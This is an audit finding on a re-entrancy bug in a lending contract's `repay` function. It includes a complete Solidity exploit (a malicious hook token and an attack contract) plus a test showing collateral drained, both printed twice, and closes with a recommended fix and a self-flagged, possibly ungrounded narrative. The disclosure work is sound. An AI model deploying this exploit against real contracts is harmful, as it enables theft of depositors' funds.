---
id: 3672
severity: "High"
---

# Lender contract can be drained by re-entrancy in `repay`

## Description

An attacker can craft a token allowing reentrant calls on transfer to drain any token from the Lender contract.

The Lender contract allows any token as loanToken and the repay function transfers the tokens before deleting the loan which result in a re-entrancy vulnerability. A malicious actor can craft a token allowing reentrant calls on transfer to exploit the re-entrancy vulnerability in the repay function and get more than one time his collateral back.

```solidity
File: Lender.Sol

L316:    // transfer the loan tokens from the borrower to the pool
            IERC20(loan.loanToken).transferFrom( // @audit - Re-entrancy can drain contract
                msg.sender,
                address(this),
                loan.debt + lenderInterest
            );
            // transfer the protocol fee to the fee receiver
            IERC20(loan.loanToken).transferFrom(
                msg.sender,
                feeReceiver,
                protocolInterest
            );
            // transfer the collateral tokens from the contract to the borrower
            IERC20(loan.collateralToken).transfer(
                loan.borrower,
                loan.collateral
            );
            emit Repaid(
                msg.sender,
                loan.lender,
                loanId,
                loan.debt,
                loan.collateral,
                loan.interestRate,
                loan.startTimestamp
            );
            // delete the loan
            delete loans[loanId];
        }
```

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L317

All tokens can be drained from the contract. This is a critical vulnerability.
POC
An attacker can use the following exploit contracts to drain the lender contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract ExploitToken is ERC20 {
    address owner;
    constructor(uint256 amount) ERC20("ExploitToken", "ET") {
        owner = msg.sender;
        _mint(msg.sender, amount);
    }

    // Hook on token transfer
    function _afterTokenTransfer(address from, address to, uint256 amount) internal override {
        (bool status,) = owner.call(abi.encodeWithSignature("tokensReceived(address,address,uint256)", from, to, amount));
        require(status, "call failed");
    }
}
```

```solidity
File: Exploit7.sol

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {ExploitToken} from "./ExploitToken.sol";
import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import "../utils/Structs.sol";
import "../Lender.sol";

contract Exploit7  {
    Lender lender;
    address collateralToken;
    ExploitToken exploitToken;
    bool loanBorrowed;
    uint256 i;

    constructor(Lender _lender, address _collateralToken) {
        lender = _lender;
        collateralToken = _collateralToken;
    }

    function attack(address _collateralToken) external {
        ERC20(_collateralToken).approve(address(lender), type(uint256).max);
        // (1) Mint exploitToken
        exploitToken = new ExploitToken(1000000 * 10**18);
        ERC20(exploitToken).approve(address(lender), type(uint256).max);
        // (2) Create a pool of exploitTokens
         Pool memory pool = Pool({
            lender: address(this),
            loanToken: address(exploitToken),
            collateralToken: _collateralToken,
            minLoanSize: 1,
            poolBalance: 1000000 * 10**18,
            maxLoanRatio: type(uint256).max,
            auctionLength: 1 days,
            interestRate: 0,
            outstandingLoans: 0
        });
        bytes32 poolId = lender.setPool(pool);
        // (3) Take a loan of exploitTokens
        Borrow memory b = Borrow({
            poolId: poolId,
            debt: 1,
            collateral: 1_000 * 10**18
        });
        Borrow[] memory borrows = new Borrow[](1);
        borrows[0] = b;        
        lender.borrow(borrows);
        // (4) Take another loan of exploitTokens to increase poolBalance
        b = Borrow({
            poolId: poolId,
            debt: 1_000,
            collateral: 1
        });
        borrows = new Borrow[](1);
        borrows[0] = b;        
        lender.borrow(borrows);
        loanBorrowed = true;
        // (5) Repay the loan
        uint256 loanId = 0;
        uint256[] memory loanIds = new uint256[](1);
        loanIds[0] = loanId;
        lender.repay(loanIds);
        // (7) Send the funds back to the attacker
        ERC20(collateralToken).transfer(msg.sender, ERC20(collateralToken).balanceOf(address(this)));   
    }

    function tokensReceived(address from, address to, uint256 amount) external {
        if (msg.sender == address(exploitToken)) {
            if (from == address(this) && to == address(lender) && loanBorrowed) {
                // (6) Re-enter the repay function (10 times for POC); 
                if (i < 10) {
                    i = i + 1;                    
                    uint256 loanId = 0;
                    uint256[] memory loanIds = new uint256[](1);
                    loanIds[0] = loanId;
                    lender.repay(loanIds);
                }          
            }
        }        
    }
}
```

Here are the tests that can be added to Lender.t.sol to illustrate the steps of an attacker:
```solidity
function test_exploit7() public {
	address attacker = address(0x5);
	// Setup
	collateralToken.transfer(address(lender), 10_000 * 10**18);
	collateralToken.transfer(address(attacker), 1_000 * 10**18 + 1); 

	// Before the exploit
	assertEq(collateralToken.balanceOf(address(lender)), 10000 * 10**18);  // Lender contract has 10000 collateralToken
	assertEq(collateralToken.balanceOf(address(attacker)), 1000 * 10**18 + 1); // Attacker has 1000 collateralToken

	// Exploit starts here
	vm.startPrank(attacker); // Attacker wants to drain all collateralTokens from the contract        
	Exploit7 attackContract = new Exploit7(lender, address(collateralToken));
	collateralToken.transfer(address(attackContract), 1_000 * 10**18 + 1);
	attackContract.attack(address(collateralToken));

	// After the exploit
	assertEq(collateralToken.balanceOf(address(lender)), 1);               // Lender contract has been drained (1 wei left)
	assertEq(collateralToken.balanceOf(address(attacker)), 11000 * 10**18); // Attacker has stolen all the 10000 collateralToken
}
```

## Proof of Concept

An attacker can use the following exploit contracts to drain the lender contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract ExploitToken is ERC20 {
    address owner;
    constructor(uint256 amount) ERC20("ExploitToken", "ET") {
        owner = msg.sender;
        _mint(msg.sender, amount);
    }

    // Hook on token transfer
    function _afterTokenTransfer(address from, address to, uint256 amount) internal override {
        (bool status,) = owner.call(abi.encodeWithSignature("tokensReceived(address,address,uint256)", from, to, amount));
        require(status, "call failed");
    }
}
```

```solidity
File: Exploit7.sol

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {ExploitToken} from "./ExploitToken.sol";
import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import "../utils/Structs.sol";
import "../Lender.sol";

contract Exploit7  {
    Lender lender;
    address collateralToken;
    ExploitToken exploitToken;
    bool loanBorrowed;
    uint256 i;

    constructor(Lender _lender, address _collateralToken) {
        lender = _lender;
        collateralToken = _collateralToken;
    }

    function attack(address _collateralToken) external {
        ERC20(_collateralToken).approve(address(lender), type(uint256).max);
        // (1) Mint exploitToken
        exploitToken = new ExploitToken(1000000 * 10**18);
        ERC20(exploitToken).approve(address(lender), type(uint256).max);
        // (2) Create a pool of exploitTokens
         Pool memory pool = Pool({
            lender: address(this),
            loanToken: address(exploitToken),
            collateralToken: _collateralToken,
            minLoanSize: 1,
            poolBalance: 1000000 * 10**18,
            maxLoanRatio: type(uint256).max,
            auctionLength: 1 days,
            interestRate: 0,
            outstandingLoans: 0
        });
        bytes32 poolId = lender.setPool(pool);
        // (3) Take a loan of exploitTokens
        Borrow memory b = Borrow({
            poolId: poolId,
            debt: 1,
            collateral: 1_000 * 10**18
        });
        Borrow[] memory borrows = new Borrow[](1);
        borrows[0] = b;        
        lender.borrow(borrows);
        // (4) Take another loan of exploitTokens to increase poolBalance
        b = Borrow({
            poolId: poolId,
            debt: 1_000,
            collateral: 1
        });
        borrows = new Borrow[](1);
        borrows[0] = b;        
        lender.borrow(borrows);
        loanBorrowed = true;
        // (5) Repay the loan
        uint256 loanId = 0;
        uint256[] memory loanIds = new uint256[](1);
        loanIds[0] = loanId;
        lender.repay(loanIds);
        // (7) Send the funds back to the attacker
        ERC20(collateralToken).transfer(msg.sender, ERC20(collateralToken).balanceOf(address(this)));   
    }

    function tokensReceived(address from, address to, uint256 amount) external {
        if (msg.sender == address(exploitToken)) {
            if (from == address(this) && to == address(lender) && loanBorrowed) {
                // (6) Re-enter the repay function (10 times for POC); 
                if (i < 10) {
                    i = i + 1;                    
                    uint256 loanId = 0;
                    uint256[] memory loanIds = new uint256[](1);
                    loanIds[0] = loanId;
                    lender.repay(loanIds);
                }          
            }
        }        
    }
}
```

Here are the tests that can be added to Lender.t.sol to illustrate the steps of an attacker:
```solidity
function test_exploit7() public {
	address attacker = address(0x5);
	// Setup
	collateralToken.transfer(address(lender), 10_000 * 10**18);
	collateralToken.transfer(address(attacker), 1_000 * 10**18 + 1); 

	// Before the exploit
	assertEq(collateralToken.balanceOf(address(lender)), 10000 * 10**18);  // Lender contract has 10000 collateralToken
	assertEq(collateralToken.balanceOf(address(attacker)), 1000 * 10**18 + 1); // Attacker has 1000 collateralToken

	// Exploit starts here
	vm.startPrank(attacker); // Attacker wants to drain all collateralTokens from the contract        
	Exploit7 attackContract = new Exploit7(lender, address(collateralToken));
	collateralToken.transfer(address(attackContract), 1_000 * 10**18 + 1);
	attackContract.attack(address(collateralToken));

	// After the exploit
	assertEq(collateralToken.balanceOf(address(lender)), 1);               // Lender contract has been drained (1 wei left)
	assertEq(collateralToken.balanceOf(address(attacker)), 11000 * 10**18); // Attacker has stolen all the 10000 collateralToken
}
```

## Recommendation

Follow the Checks - Effect - Interactions (CEI) pattern by deleting the loan loans[loanId] before transferring the funds AND use nonReentrant modifiers

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is a classic re‑entrancy flaw that occurs in the repay function of the lending contract. When a borrower calls repay, the contract first transfers the outstanding loan amount and the protocol fee from the caller to itself using ERC20.transferFrom, then transfers the collateral back to the borrower, and only after these external calls does it delete the loan record. Because the loan data is removed after the token transfers, a malicious ERC20 token can execute code during its transferFrom hook (for example in _afterTokenTransfer) and call the repay function again before the original loan entry is cleared. By re‑entering repay multiple times, the attacker can cause the contract to transfer the same collateral repeatedly, effectively draining all tokens that were held as collateral. The bug is triggered whenever any token is used as the loan token and the token’s transfer implementation allows a callback, which is possible for custom ERC20 contracts. The impact is that the protocol’s collateral pool can be emptied, leaving legitimate borrowers without their pledged assets and causing the protocol’s accounting to break – users see their expected collateral return disappear and the contract balance drop to near zero. The issue was discovered during a security audit that examined the order of state changes and external calls, and it was demonstrated with a proof‑of‑concept exploit that creates a token with a transfer hook that re‑enters repay ten times. The flaw is subtle because ERC20.transferFrom is often assumed to be a simple value move without side effects, so developers may overlook the need for a re‑entrancy guard. To remediate, the contract should follow the Checks‑Effects‑Interactions pattern: delete or update the loan record before performing any external token transfers, and protect the function with a nonReentrant modifier or equivalent lock. This change ensures that even if a token’s transfer triggers a callback, the loan state is already finalized and cannot be abused, preserving the integrity of the collateral accounting.
